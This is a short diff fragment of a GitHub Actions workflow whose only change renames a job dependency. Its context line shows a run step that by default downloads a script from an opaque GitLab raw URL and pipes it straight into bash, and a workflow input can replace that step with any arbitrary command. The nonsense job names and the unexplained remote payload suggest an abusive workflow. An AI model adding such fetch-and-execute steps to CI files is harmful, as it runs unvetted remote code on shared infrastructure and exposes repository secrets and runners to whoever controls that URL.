@@ -38,7 +38,7 @@ jobs:
         run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
 
   dert:
-    needs: [hert]
+    needs: [nert]
     runs-on: ubuntu-latest
     timeout-minutes: 5
     strategy:
